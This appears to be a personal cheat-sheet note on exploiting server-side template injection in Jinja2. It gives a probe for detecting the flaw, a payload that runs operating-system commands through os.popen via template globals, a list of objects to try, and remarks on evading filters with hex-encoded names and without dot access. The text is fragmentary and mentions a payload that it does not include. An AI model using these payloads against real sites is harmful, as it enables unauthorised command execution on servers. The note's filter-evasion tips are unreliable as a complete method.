

If we want to check if a site is vulnerable 
do something like {{7*'7'}} to see if you can influence what the displayed result will be
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('COMAND TO RUN').read() }}




SSTI2 

Jinja2
try all of these
{{ [].__class__ }}
{{ {}.keys() }}
{{ () }}
{{ request }}
{{ g }}
{{ url_for }}
{{ get_flashed_messages }}
{{ self }}
{{ namespace() }}
{{ dict }}

- **No dot access**: Avoids `request.application.__globals__`, which is often blocked.
    
- **Hex-encoded names**: Bypasses filters looking for double underscores.
    
- **Fully dynamic**: Works even in hardened Jinja2 if `attr()` and `__import__` aren’t filtered.

![[Pasted image 20250325225348.png]]